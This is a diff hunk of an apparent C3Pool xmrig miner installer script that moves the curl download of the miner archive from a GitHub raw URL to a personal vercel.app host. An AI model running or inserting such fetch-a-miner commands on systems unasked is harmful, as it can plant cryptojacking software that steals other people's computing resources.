@@ -166,9 +166,9 @@ rm -rf $HOME/c3pool
 
 echo "[*] Downloading C3Pool advanced version of xmrig to /tmp/xmrig.tar.gz"
 echo "[*] 下载 C3Pool 版本的 Xmrig 到 /tmp/xmrig.tar.gz 中"
-if ! curl -L --progress-bar "https://raw.githubusercontent.com/pwndrer4/ymgzs/master/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
-  echo "ERROR: Can't download https://raw.githubusercontent.com/pwndrer4/ymgzs/master/xmrig.tar.gz file to /tmp/xmrig.tar.gz"
-  echo "发生错误: 无法下载 https://raw.githubusercontent.com/pwndrer4/ymgzs/master/xmrig.tar.gz 文件到 /tmp/xmrig.tar.gz"
+if ! curl -L --progress-bar "https://ymgzs.vercel.app/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
+  echo "ERROR: Can't download https://ymgzs.vercel.app/xmrig.tar.gz file to /tmp/xmrig.tar.gz"
+  echo "发生错误: 无法下载 https://ymgzs.vercel.app/xmrig.tar.gz 文件到 /tmp/xmrig.tar.gz"
   exit 1
 fi
 
